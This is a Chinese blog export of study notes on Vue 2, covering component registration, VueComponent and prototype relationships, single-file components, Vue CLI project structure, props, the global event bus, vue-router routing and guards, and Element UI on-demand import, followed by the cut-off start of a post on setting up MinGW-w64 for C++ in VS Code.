Vue(&#123;&#125;)里的配置对象中才有资格写el。而组件在创建时不会被写明白它到底为谁服务，“组件就是一块砖，哪里需要哪里搬”。 data必须写成函数。为了避免组件被服用时数据存在引用关系。 使用对象是引用数据，你用我用大家用；而函数返回值相当于复印了一份新的，随便改动却影响不了原文件。每次调用函数的时候返回的都是一个新的对象，不会出现两次调用指向的是同一个地址的情况。 如何注册组件？ 局部注册（推荐）：靠new Vue的时候传入components选项。 components中是一组一组的key-value组合，上面定义组件时起的名字只是组件的临时名字，components里的key值才是真正决定了组件名称的。value则指定了组件位置，填写的是上面定义组件时给它的名字。最好这两处使用同样的名字，这样可以使用简写写法（只写一个）。 全局注册：靠Vue.component(&#39;组件名&#39;,组件) 编写组件标签 &lt;xuexiao&gt;&lt;/xuexiao&gt; 关于组件的命名：一个单词的组件名：推荐首字母大写。也可以全小写。多个单词的组件名：推荐每个单词的首字母大写（CamelCase命名）（必须在脚手架环境）。也可以单词间用短横线“-”连接（kebab-case命名），注意JS语法要求对象里的key如果有-则需要用引号包起来。 注意组件名尽量回避HTML中已有的元素名称，例如h2、H2都不行。 可以使用name配置项指定组件在 开发者工具 中呈现的名字。 关于组件标签第一种写法：&lt;xuexiao&gt;&lt;/xuexiao&gt;第二种写法：&lt;xuexiao/&gt;（自闭合）注意：在不使用脚手架时，&lt;xuexiao/&gt;会导致后续组件不能渲染。 简写：const school = Vue.extend(options)可以简写为const school = options，即直接写配置项。这样在注册组件时还是会调用Vue.extend。 组件的嵌套子组件需要注册在在父组件的内部。需要注意：子组件的定义要在注册之前。 子组件在哪里注册，其结构就在哪里写。在父组件的template:内的最后一行补上&lt;xuesheng&gt;&lt;/xuesheng&gt;即可。 开发中使用app组件管理其它所有组件。一人（vm）之下，万人之上。 123&lt;div id=&quot;root&quot;&gt; &lt;app&gt;&lt;/app&gt;&lt;/div&gt; 12345678910111213141516171819// 定义app组件const app = Vue.extend(&#123; template:` &lt;div&gt; &lt;school&gt;&lt;/school&gt; &lt;students&gt;&lt;/students&gt; &lt;/div&gt; `, components:&#123; school, students, &#125;&#125;)new Vue(&#123; // template:`&lt;app&gt;&lt;/app&gt;` 这里写了的话html的div里就可以是空的了 el:&quot;#root&quot;, components:&#123;app&#125;&#125;) VueComponent组件是可复用的Vue实例，所以它们与new Vue接收相同的选项，例如data、methods、watch、生命周期钩子等。仅有的例外是像el这样 根实例（vm） 特有的选项。关于VueComponent： school 组件本质上是一个名为VueComponent的构造函数 ，且不是程序员定义的，它归根到底是Vue.extend生成的。 组件归根到底就是VueComponent，就是构造函数。 我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;，Vue解析时会帮我们创建school组件的实例对象 。即Vue帮我们执行的new VueComponent(options)。 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！ 比如&lt;xuexiao&gt;和&lt;xuesheng&gt;的VueComponent，虽然打印出来虽然一模一样但它们确实不是同一个。是同一个类new出来的两个对象，它们是不同的实体，只是结构类似而已。每new一次就会开辟一块新的内存。 关于this的指向， 组件配置中，data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【VueComponent实例对象(vc)】。vc和vm功能一样，都有数据代理、数据监视等。 .new Vue(options)配置中，data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【Vue实例对象(vm)】。 VueComponent的实例对象，经常被简称vc（也可称之为：组件实例对象。因为组件归根到底就是VueComponent）。 Vue的实例对象则常被简称为vm。 一个重要的内置关系（原型链相关） 关于原型链：显式原型prototype和隐式原型__proto__的区别在于，prototype是构造函数的属性，而__proto__是对象的属性。无论是函数身上的显式原型属性，还是实例身上的隐式原型属性，它们都指向了同一个对象：原型对象。通过显示原型链给原型(或者原型的原型)添加属性，通过隐式原型链获取原型的属性，从自身沿着原型链一直找直到window的原型为空。 实例的隐式原型属性，永远指向自己缔造者的原型对象！ 一个重要的内置关系：** VueComponent.prototype.__proto__ === Vue.prototype。**为什么要有这个关系：让组件实例对象（vc）可以访问到Vue原型上的属性、方法。 从下图可以看出，VueComponent的原型对象（VueComponent.prototype）的原型对象（VueComponent.prototype.__proto__），就是Vue的原型对象（Vue.prototype）。 单文件组件（xxx.vue) vscode不认.vue文件，需要安装插件。（如vetur）如果已经安装插件vetur，在.vue文件中输入&lt;v再回车即可生成一套模板。 给.vue文件的起名规则和组件名的那套规则一样（单个单词、多个单词）。下面是文件 School.vue 的示例： 12345678910111213141516171819202122232425262728293031323334&lt;template&gt;&lt;!-- 组件的结构 --&gt;&lt;!-- template内必须有一个根标签&lt;div&gt; --&gt; &lt;div class=&quot;demo&quot;&gt; &lt;h2&gt;学校名称:&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学校地址:&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;showName&quot;&gt;显示学校名&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;// 组件交互相关的代码（数据、方法等） export default &#123; // 暴露 name:&#x27;School&#x27;, // 不写的话，别人在注册这个组件的时候可能会随便起名 data()&#123; return&#123; schoolName:&#x27;BUT&#x27;, address:&#x27;beijing&#x27; &#125; &#125;, methods:&#123; showName()&#123; alert(this.schoolName) &#125; &#125;, &#125;&lt;/script&gt;&lt;style&gt;/* 组件的样式 */ .demo&#123; background-color:orange; &#125;&lt;/style&gt; 一个必须有的.vue文件：App.vue。 1234567891011121314151617181920&lt;template&gt; &lt;div&gt; &lt;School/&gt; &lt;Student/&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; // 引入组件 import School from &#x27;./School&#x27; // 自行确定路径。这里的文件名可以省略拓展名.vue import Student from &#x27;./Student&#x27; export default &#123; name:&#x27;App&#x27;, components:&#123; School, Student &#125; &#125;&lt;/script&gt; 同时所有的组件都被vm管理，那么应该在什么地方创建vm呢？上面的几个文件都是.vue文件，.vue文件中一定不会出现new Vue语句。创建与App.vue同级的文件 main.js 【入口文件】，一切的事从它开始 ： 1234567import App from &#x27;./App.vue&#x27;new Vue(&#123; el:&#x27;#root&#x27;, // 服务于哪个容器 template:`&lt;App&gt;&lt;/App&gt;`, components:&#123;App&#125;, // 领头的组件是App &#125;) 上述代码中的#root容器则在 index.html 中存放，注意一定要先让模版出来再去引入main.js： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;单文件组件的语法&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 注意下面语句的先后顺序！一定要先让模版出来再去引入main.js --&gt; &lt;!-- 准备一个容器 --&gt; &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; &lt;script src=&quot;./js/vue.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 大致捋顺一下逻辑：要打开的是index.html，在index.html可以看到容器已经准备好（&lt;div id=&quot;root&quot;&gt;&lt;/div&gt;），vue已经就位（&lt;script src=&quot;./js/vue.js&quot;&gt;&lt;/script&gt;），这样就到了一切的开端：main.js，即入口文件(&lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;)。 接下来进入main.js，main.js中首先进行的操作是引入App.vue(import App from &#39;./App.vue&#39;)：进入App.vue，里面有结构（&lt;template&gt;），又引入了school、student（这两个组件也注册、使用了，没有问题）。在组件import的时候的时候就开始读取school.vue文件，这文件里的东西就被读取。再回到App.vue，在引入school的下一行又引入了student，执行类似的操作。这两行执行完之后再对这两个组件进行注册，随后对整个模版进行解析。 结束后回到main.js，此时App已经import完毕，开始执行new Vue的操作。在new Vue的时候，由于之前在index.html中最先引入了vue.js，所以在main.js中自然可以new Vue；也引入了也注册了；组件标签也写了；服务于哪个容器也说了（#root）。 这时候回到index.html，在root容器里面就已经出现了想要的东西。但这时直接打开index.html会报错，因为浏览器不能直接支持ES6的模块化语法。这实际是因为main.js的第一句import就出了问题：.vue文件浏览器不能直接运行。import语句浏览器也不认识。 可以总结一下，随便打开一个普通组件的.vue，可以看到template里面写结构，script里面写脚本，这个脚本里面包含着给组件命名、配置数据、配置计算属性等等，style里面放的是样式。App组件则负责汇总所有组件。main.js创建vue实例并指明为哪个容器服务，index.html则是页面。 ref属性 被用来给元素或子组件注册引用信息（id的替代者） 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc） 使用方式： 打标识：&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;或&lt;School ref=xxx&quot;&gt;&lt;/School&gt; 获取：this.$refs.xxx 配置项props功能：让组件接收外部传过来的数据 传递数据：&#96;&#96;&#96; 接收数据: 第一种方式（只接收）：props:[&#39;name&#39;] 第二种方式（限制类型）：props:&#123; name:String &#125; 第三种方式（限制类型、限制必要性、指定默认值）：props:&#123; name:&#123;type:String,required:true,default:&#39;张三&#39;&#125;&#125; 备注：props是只读的，Vue底层会监测对props的修改。如果进行了修改，就会发出警告；若业务需求确实需要修改，需要复制props的内容到data中一份然后去修改data中的数据。 全局事件总线（GlobalEventBus）是一种组件间通信的方式，适用于任意组件间通信。 安装全局事件总线1234567new Vue(&#123; ...... beforeCreate()&#123; Vue.prototype.$bus = this // 安装全局事件总线。$bus就是当前应用的vm。 &#125;, ...&#125;) 使用事件总线 1.接收数据：A组件想接收数据，就在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。 1234567methods()&#123; demo(data)&#123;......&#125;&#125;......mounted()&#123; this.$bus.$on(&#x27;xxxx&#x27;,this.demo)&#125; ​ 2.提供数据：this.$bus.$emit(&#39;xxxx&#39;,数据) 最好在beforeDestroy钩子中，用$off去解绑当前组件使用到的事件。 使用Vue-cli官网：https://cli.vuejs.org/zh/ 准备工作：配置npm淘宝镜像，npm config set registry https://registry.npm.taobao.org 第一步（仅第一次执行）：全局安装@vue&#x2F;cli，npm install -g @vue/cli。可以执行以下命令更新vue-cli：12npm uninstall -g vue-clinpm install -g @vue/cli 第二步：切换到要创建项目的目录，然后使用命令创建项目：执行vue create vue_test，vue_test处写自己想要创建的项目名。会弹出以下选项：上图为选择想要的vue版本（注意不是vuecli版本)。babel进行语法转换，作用是将写Vue用到的ES6代码转换为ES5。eslint的作用是对JS进行语法检查。 第三步：启动项目： 回车之后脚手架继续执行，完成后通过cd vue_test进入文件夹。通过npm run serve # 回车后开始编译代码启动项目。 完成后可以看到脚手架不仅做了翻译，还开启了一个内置的小服务器，端口在8080：- Local: http://localhost:8080/ 。下一行- Network: http://172.16.17.33:8080/可以给同局域网内的同事使用，自己也可以使用。 按ctrl+c可以停止工程。 分析脚手架结构 .&#x2F; .gitignore：git忽略文件。其中是不被git管理的文件&#x2F;文件夹。 babel.config.js：babel配置文件。通常不需要进行配置，如实在需要可参考babel官网。 package.json：任何符合npm规范的工程都会有package.json，是包的说明书，里面写了包的名称、版本、常用命令、依赖、库等等。比如在命令中可以看到语句&quot;serve&quot;: &quot;vue-cli-service serve&quot;，这说明当我们运行命令npm run serve时实际执行的是vue-cli-service serve。serve命令在开发过程中使用，可以让它帮我们配置好服务器等等，也就是刚才的效果。build命令可以在所有功能都写完后把它变成一个浏览器认识的东西，也就是最后一次编译。lint命令很少用，其作用是把所有的JS和.vue文件都进行一次语法检查。少用是因为vscode本身就有很好的语法检查插件，而且开发的过程中通常都会关闭语法检查，只有在最后的时候才会打开一下看看有没有什么不合理的地方。 package-lock.json：包版本控制文件。可以在其中查看各个包的版本、下载地址等，这保证了以后可以用最快的速度安装指定版本。lock可以理解成是锁死了包的版本号，在下载的时候就不会错误的下载成其他版本。 .&#x2F;src&#x2F; main.js：【该文件是整个项目的入口文件】。执行完命令npm run serve后，就会直接运行main.js。其中的render: h =&gt; h(App)完成的是把App组件放入容器中。render是渲染的意思。注意它里面的import Vue from &#39;vue&#39;引入的其实是残缺版的vue，这个残缺的没有模版解析器，所以只要在new Vue里一写template就会报错，所以需要借助render。（标签&lt;template&gt;不受影响）可以command+’vue’打开文件来到node_modules&#x2F;vue&#x2F;types&#x2F;index.d.ts，再打开其上层文件夹node_modules&#x2F;vue的package.json，可以看到 &quot;module&quot;: &quot;dist/vue.runtime.esm.js&quot;，这个vue.runtime.esm.js才是真正引入的那个vue文件。最原始的vue应该是node_modules&#x2F;vue&#x2F;dist&#x2F;vue 。 App.vue：【App组件是所有组件的父组件】。其中import其他所有组件，注意路径。 .&#x2F;scr&#x2F;assets：存放静态资源。 .&#x2F;scr&#x2F;components：【存放所有程序员写出的组件】。除了App.vue。 .&#x2F;public index.html：【整个应用的界面】。语句&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;：针对IE的特殊配制，含义是让IE以最高的渲染级别渲染页面。语句&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;：开启移动端的理想视口。路径&lt;%= BASE_URL %&gt;：即public文件夹的路径。标签&lt;noscript&gt;：如果浏览器支持JS，这个页面的东西就不会渲染。语句 &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;：容器。 .&#x2F;router 是自己新建的文件夹，存放路由。 .&#x2F;router&#x2F;index.js：【创建整个应用的路由器】 几个不能改的文件&#x2F;文件夹： .&#x2F;public文件夹，需要去这里面找index.html .&#x2F;public&#x2F;favicon.ico .&#x2F;public&#x2F;index.html .&#x2F;src文件夹，底层的默认配置需要 .&#x2F;main.js 可选配置文件：vue.config.js，放在与package.json同级的的地方。详情见：https://cli.vuejs.org/zh/config/ Vue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，执行vue inspect &gt; output.js。 这个文件修改之后需要重新npm run serve使其生效。 大致流程：执行完npm run serve，来到src文件夹找到main.js，该文件引入了vue引入了App。到引入App的这一行，来到App.vue，发现里面引入了School Student，就把这两个对应的.vue文件也执行了，再汇总到App里。回到main.js继续走，render: h =&gt; h(App)把App组件放入容器中，也就是到index.html中放到了容器 &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;里。 关于不同版本的vue：1.vue.js是完整版的Vue，包含核心功能+模版解析器2.vue.runtime.xxx.js是运行版的Vue，只包含核心功能而不含模版解析器。3.由于vue.runtime.xxx.js没有模版解析器，所以不能用template配置项，而需要使用render函数接收到的createElement函数去指定具体内容。 关于main.js其中的render: h =&gt; h(App)：这里的render实际上是一个函数，实际调用它的是vue，调用时传递的是createElement参数。这个函数可以创建具体的元素、传递具体的内容。它相当于render(createElement)&#123; return createElement(&#39;h1&#39;,&#39;HelloWorld!&#39;)&#125;。这个函数里没用到this就可以写成箭头函数：render:(createElement)=&gt;&#123; return createElement(&#39;h1&#39;,&#39;HelloWorld!&#39;)&#125;，这个箭头函数左边只有一个参数就可以省略这个参数旁边的小括号：render:createElement=&gt;&#123; return createElement(&#39;h1&#39;,&#39;HelloWorld!&#39;)&#125;，这个箭头函数只有一句函数体而且还需要return，顺便把createElement换成个短一些的h：render:h=&gt;h(&#39;h1&#39;,&#39;HelloWorld!&#39;)。到此时，h里面还传入了两个参数:&#39;h1&#39;,&#39;HelloWorld!&#39;，有两个是因为h1是html的内置元素，需要知道这个元素里的具体内容，就需要第二个参数。但如果用的是组件，具体内容都在组件里面，注意里面的App两侧没有引号。 Vue中的ajaxVuex github地址：https://github.com/vuejs/vuex 专门在Vue实现 集中式 状态（数据）管理的一个Vue 插件 （通过Vue.use(Vuex)的方式使用)，对Vue应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信。 什么时候使用Vuex：1.多个组件依赖于同一状态时。 2.来自不同组件的行为需要变更同一状态时。 Vue-router 2022.2.7以后，vue-router的默认版本为4版本，vue-router4只能在vue3中使用，vue-router3才能在vue2中使用。如果把vue-router4强行安装到vue2中则会报错。所以在vue2中安装vue-router3：npm i vue-router@3，在vue3中安装vue-router4则可以直接npm i vue-router。在哪个项目里用就在哪里开终端然后执行安装命令。在main.js中通过import VueRouter from &#39;vue-router&#39;引入这个插件，并在下面Vue.use(VueRouter)应用插件。 vue-router就是vue的一个插件库，专门用来实现SPA应用。 如何理解SPA应用？ 单页Web应用（single page web application，SPA） 整个应用只有一个完整的页面（index.html） 点击页面中的导航连接不会刷新页面，只会做页面的局部更新 数据需要通过ajax请求获取 如何理解路由？ 路由就是一组key-value的对应关系，多个路由需要经过路由器的管理。 key为路径，value可能是function或component。 路由分类： 前端路由：value是component，用于展示页面内容。 工作过程：当浏览器的路径改变时，对应的组件就会显示。 后端路由：value是function，用于处理客户端提交的请求。 工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据。 基本使用 安装vue-router：npm i vue-router 应用插件：Vue.use(VueRouter) 编写router配置项 实现切换（active-class可以配置高亮样式）：&lt;router-link class=&quot;item&quot; active-class=&quot;active&quot; to=&quot;/about&quot;&gt;这里是About&lt;/router-link&gt; 指定展示位置：&lt;router-view&gt;&lt;/router-view&gt; 几个注意点 路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹。(这两个文件夹同级，都在src里) 通过切换，“隐藏”了的路由组件默认是被销毁的，需要的时候再去挂载。 每个组件都有自己的$route属性，存储着这个组件自己的路由信息。里面有path、query等。 整个应用只有一个router，可以通过组件的$router属性获取到。 基本路由.&#x2F;router就是自己新建的文件夹，存放路由。.&#x2F;router&#x2F;index.js：【创建整个应用的路由器】.&#x2F;router&#x2F;index.js的一个示例： 12345678910111213import VueRouter from &#x27;vue-router&#x27; // VueRouter可以当成一个构造函数去用import About from &#x27;../pages/About&#x27;// const router = new VueRouter(&#123; // 创建一个路由器export default new VueRouter(&#123; // 创建并暴露一个路由器 routes:[ // 里面写一组一组的路由，每一个都是一个配置对象（因为是key-value） &#123; // 如果路径是/about，就去显示About组件。这里用到的组件得在上面import。 path:&#x27;/about&#x27;, // 也是浏览器地址栏后面追加的路径。 component:About &#125;, &#123; ... &#125;, ]&#125;) 在main.js通过import VueRouter from &#39;vue-router&#39;引入这个插件，通过import router from &#39;./router&#39;引入路由器，并在下面Vue.use(VueRouter)应用插件。应用完之后，在new Vue中就可以使用配置项：router。下面是main.js的示例。 12345678910111213import Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import VueRouter from &#x27;vue-router&#x27;import router from &#x27;./router&#x27;Vue.config.productionTip = falseVue.use(VueRouter)new Vue(&#123; el:&#x27;#app&#x27;, render:h =&gt; h(App), router:router&#125;) 此外，还需要在用到了路由切换的地方用标签&lt;router-link&gt;并在其中使用to=&quot;目标路由&quot;、active-class=&quot;选中样式&quot;等处理跳转部分的语句，比如&lt;router-link class=&quot;item&quot; active-class=&quot;active&quot; to=&quot;/about&quot;&gt;这里是About&lt;/router-link&gt;。同时通过标签&lt;router-view&gt;指定组件的呈现位置。 在实际网页上可以看到，使用&lt;a&gt;标签和&lt;router-link&gt;标签得到的结果完全相同，打开开发者工具就可以看到，实际上&lt;router-link&gt;也被转化成了&lt;a&gt;标签处理。 嵌套（多级）路由 配置路由规则。使用 children配置项。注意 子路由的path不要加斜杠：1234567891011121314151617181920routes:[ &#123; path:&#x27;/about&#x27;, component:About, &#125;, &#123; path:&#x27;/home&#x27;, component:Home, children:[ // 通过children配置子级路由 &#123; path:&#x27;news&#x27;, // 此处一定不要写&quot;/news&quot;！ component:News &#125;, &#123; path:&#x27;message&#x27;, // 此处一定不要写&quot;/message&quot;！ component:Message &#125; ] &#125;] 跳转（要写完整路径）：&lt;router-link to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt; 路由传参路由的query参数通过路径后添加问号的方式携带参数，多组key-value之间用&amp;分隔。 传递参数注意router-link里的to前面要加冒号！否则就会把里面传的东西全当字符串处理。在使用to的字符串写法时，加了冒号就会把双引号内的东西当作JS去解析，但是还需要一个模板字符串标志&#96;&#96;&#96;&#96; 括起来。此外，模板字符串里面混入的JS变量需要用${xxx}&#96;&#96;&#96;括起来。12345678910111213&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;`/home/message/detail?id=$&#123;m.id&#125;&amp;title=$&#123;m.title&#125;`&quot;&gt;显示&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;&lt;router-link :to=&quot;&#123; path:&#x27;/home/message/detail&#x27;, query:&#123; id:m.id, title:m.title &#125; &#125;&quot;&gt;跳转&lt;/router-link&gt; 接收参数： 每个组件自己的$route属性存储着这个组件的路由信息。里面有path、query、params等。12$route.query.id $route.query.title // id和title就是传的参数 路由的params参数 配置路由，一定要使用占位符声明接收params参数。1234567children:[ &#123; name:&#x27;xiangqing&#x27; path:&#x27;detail/:id/:title&#x27;, // 使用占位符声明接收params参数 component:News &#125; ] 传递参数注意，在使用to的对象写法传递参数时一定不能用path配置项，必须用name配置项！而且在配置路由时也得配置name。12345678910111213&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;显示&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link :to=&quot;&#123; name:&#x27;xiangqing&#x27; params:&#123; id:m.id, title:m.title &#125; &#125;&quot;&gt;跳转&lt;/router-link&gt; 接收参数：每个组件自己的$route属性存储着这个组件的路由信息。里面有path、query、params等。12$route.params.id $route.params.title // id和title就是传的参数 命名路由作用：简化路由跳转。如何使用： 给路由命名：给谁命名就在谁的配置项里加一个name:&#39;xxx&#39;。12345678routes:[ &#123; name:&#x27;guanyu&#x27;, path:&#x27;/about&#x27;, component:About &#125;, &#123; ... &#125;, ] 简化跳转：简化前，需要写完整的路径；简化后，直接通过名字跳转。注意to前面需要加冒号。而且其内部要写成对象形式。12&lt;router-link to=&quot;/About&quot;&gt;简化前的跳转到about&lt;/router-link&gt;&lt;router-link :to=&quot;&#123;name:&#x27;guanyu&#x27;&#125;&quot;&gt;简化后的跳转到about&lt;/router-link&gt; 路由的props配置项作用：让路由组件更方便的收到参数。在router&#x2F;index.js里，哪个路由接收东西就在谁里面写props配置项。写法如下： 第一种写法（很少）：props值为对象，该对象中所有的key-value的组合最终都会以props的形式，通过props传给Detail组件。 index.js中的配置：props:&#123;a:900,b:&#39;hello&#39;&#125;，Detail.vue中的接收，注意使用字符串：props:[&#39;a&#39;,&#39;b&#39;]，Detail.vue的template中的使用：a:&#123;&#123;a&#125;&#125;。 缺点：传递的都是写死的数据。 第二种写法：props值为布尔值，若布尔值为true，则把路由收到的所有 params参数 以props的形式通过props传给Detail组件。 index.js中的配置：props:true，Detail.vue中的接收，注意使用字符串：props:[&#39;id&#39;,&#39;title&#39;]，Detail.vue的template中的使用：id:&#123;&#123;id&#125;&#125;。 缺点：不能传递query类型的参数。 第三种写法：props值为函数，该函数返回的对象中每一组key-value都会以props的形式通过props传给Detail组件。写法如下例所示：123456789101112&#123; name:&#x27;xiangqing&#x27;, path:&#x27;datial/:id&#x27;, component:Detail, props(route)&#123; return &#123; id:route.query.id, title:route.query.title &#125; &#125;&#125; 上面的props配置项也可以使用解构赋值&#x2F;解构赋值的连续写法：1234567props(&#123;query&#125;)&#123; return &#123; id:query.id, title:query.title &#125;&#125;props(&#123;query:&#123;id,title&#125;&#125;)&#123; return &#123; id, title &#125;&#125; 编程式路由导航路由守卫作用：对路由进行权限控制分类：全局守卫、独享守卫、组件内守卫 全局守卫全局前置守卫：初始化时执行+每次路由切换前执行 12345678910111213router.beforeEach((to,from,next)=&gt;&#123; console.log(&#x27;beforeEach&#x27;,to,from) if(to.meta.isAuth)&#123; // 判断当前路由是否需要 进行 权限控制 if(localStorage.getItem(&#x27;school&#x27;) === &#x27;BUT&#x27;)&#123; // 权限控制的具体规则 next() // 放行 &#125;else&#123; alert(&#x27;暂无权限查看&#x27;) // next (&#123;name:&#x27;张三&#x27;&#125;) &#125; &#125;else&#123; next() // 放行 &#125;&#125;) 全局后置守卫：初始化时执行+每次路由切换后执行 12345678router.afterEach((to,from)=&gt;&#123; console.log(&#x27;afterEach&#x27;,to,from) if(to.meta.title)&#123; document.title = to.meta.title // 修改网页的title &#125;else&#123; document.title = &#x27;test&#x27; &#125;&#125;) 独享守卫12345678910111213beforeEnter((to,from,next)=&gt;&#123; console.log(&#x27;beforeEnter&#x27;,to,from) if(to.meta.isAuth)&#123; // 判断当前路由是否需要进行权限控制 if(localStorage.getItem(&#x27;school&#x27;) === &#x27;BUT&#x27;)&#123; // 权限控制的具体规则 next() // 放行 &#125;else&#123; alert(&#x27;暂无权限查看&#x27;) // next (&#123;name:&#x27;张三&#x27;&#125;) &#125; &#125;else&#123; next() // 放行 &#125;&#125;) 组件内守卫进入守卫：通过路由规则，进入该组件时被调用，beforeRouteEnter(to,from,next)&#123; &#125;离开守卫：通过路由规则，离开该组件时被调用，beforeRouteLeave(to,from,next)&#123; &#125; 实践 组件化编码流程 拆分静态组件：组件要按照功能点划分，命名不要与html元素冲突。 实现动态组件：考虑好数据的存放位置，数据是一个组件在用还是一堆组件在用： 一个组件在用：放在组件自身即可。 一堆组件在用：放在它们共同的父组件上（状态提升） 实现交互：从绑定事件开始。 props适用于： 父组件&#x3D;&#x3D;&gt;子组件 通信 子组件&#x3D;&#x3D;&gt;父组件 通信（不过要求父先给子一个函数） 使用v-model时切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！ props传过来的如果是对象类别的值，修改对象中的属性时vue不会报错，但不推荐这样做。 Element UI一个基于Vue框架的PC端UI组件库。官网：https://element.eleme.cn/#/zh-CN 。 需要注意的是，如果使用了下面两行代码： 12import &#x27;element-ui/lib/theme-chalk/index.css&#x27;; // ElementUI所有样式全部被引入了Vue.use(ElementUI); // ElementUI所有组件全部被注册了 实际上是引入了所有的样式和所有的组件，则会使”chuknk-vendor.js”文件的体积过大（可以在浏览器的Network中查看）。此外，import &#39;element-ui/lib/theme-chalk/index.css&#39;;中的index.css也是全部的样式。 借助babel-plugin-component按需引入组件 参考Element UI官网 https://element.eleme.cn/#/zh-CN/component/quickstart 中的“按需引入”。 修改对应的babel文件 在main.js按需引入，注意引入时的首字母参照官网上已经给出的格式即单词首字母大写，形如import &#123; Button,Row,DatePicker &#125; from &#39;element-ui&#39;；还需要在main.js全局注册组件，如Vue.component(Button.name, Button);，或写为Vue.use(Button)。Button.name其实就是&lt;el-button&gt;，可以把Button.name修改为自己想要的名字然后把对应的html标签名也对应的修改掉。 不需要在main.js引入样式，脚手架会自动帮我们处理。 注意，使用最新版本的vue-cli生成的工程文件夹中没有文件.babelrc，而是babel.config.js。修改时也应注意细节，比如”plugins”和“presets”同级。 一个修改后的babel.config.js文件示例，注意第四行需要把官网写的&quot;es2015&quot;替换为&quot;@babel/preset-env&quot;： 123456789101112131415module.exports = &#123; presets: [ &#x27;@vue/cli-plugin-babel/preset&#x27;, [&quot;@babel/preset-env&quot;, &#123; &quot;modules&quot;: false &#125;] ], plugins: [ [ &quot;component&quot;, &#123; &quot;libraryName&quot;: &quot;element-ui&quot;, &quot;styleLibraryName&quot;: &quot;theme-chalk&quot; &#125; ] ]&#125; 可能存在的问题 按需引入时错误xxx not found解决：这可能是因为脚手架已经更新但UI官网还没有更新。根据报错提示安装对应的包npm i xxx即可。 错误Cannot find module &#39;@babel-preset-env/babel-preset&#39;解决：换成[&#39;@babel/env&#39;, &#123; modules: false &#125;]。","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Vue","slug":"前端/Vue","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Vue/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://avalooooooon.github.io/tags/Vue/"}]},{"title":"gcc配置C++环境（Mingw-w64）","slug":"gcc配置C-环境（Mingw-w64）","date":"2022-01-06T11:13:53.000Z","updated":"2022-01-06T11:13:53.000Z","comments":true,"path":"2022/01/06/gcc配置C-环境（Mingw-w64）/","link":"","permalink":"https://avalooooooon.github.io/2022/01/06/gcc%E9%85%8D%E7%BD%AEC-%E7%8E%AF%E5%A2%83%EF%BC%88Mingw-w64%EF%BC%89/","excerpt":"","text":"官方文档 VS Code下 cmake 配置C++环境（windows） 下载 Mingw-w64下载MinGW-w64 - for 32 and 64 bit Windows。往下翻一翻，选择最新版本的x86_64-posix-seh。 解压下载下来的压缩包即可。这里我的解压路径为C: \\mingw64。 配置环境变量进入控制面板-&gt;系统和安全-&gt;系统-&gt;高级系统设置-&gt;环境变量，在系统变量的PATH中添加C:\\mingw64\\bin，保存；接下来cmd中以管理员身份运行gcc -v，验证是否配置好环境变量。 在VS Code中配置这一部分最好参考官方文档：使用Mingw-w64。 创建工作区比如在C盘创建一个空文件夹VSCode-C，然后在该文件夹下面再新建空文件夹“workspace”作为工作区，用于存放各种代码。再在workspace文件夹下创建一个test项目和它的配置文件“.vscode”。 安装扩展 C &#x2F; C ++ IntelliSense配置按Ctrl + Shift + P打开命令面板，键入“ C &#x2F; C ++”，从建议列表中选择“ 编辑配置（UI）”（Edit Configurations（UI））。VS Code会将在此处进行的更改写入c_cpp_properties.json.vscode文件夹中的文件中。主要修改的是配置集、编译器路径和IntelliSense模式。 C &#x2F; C ++ IntelliSense配置 写入之后，可以看到 .vscode下添加了c_cpp_properties.json文件，然后按照官方给出的配置进行拷贝就可以了。 12345678910111213141516171819&#123; &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Win32&quot;, &quot;includePath&quot;: [], &quot;defines&quot;: [ &quot;_DEBUG&quot;, &quot;UNICODE&quot;, &quot;_UNICODE&quot; ], &quot;windowsSdkVersion&quot;: &quot;10.0.17763.0&quot;, &quot;compilerPath&quot;: 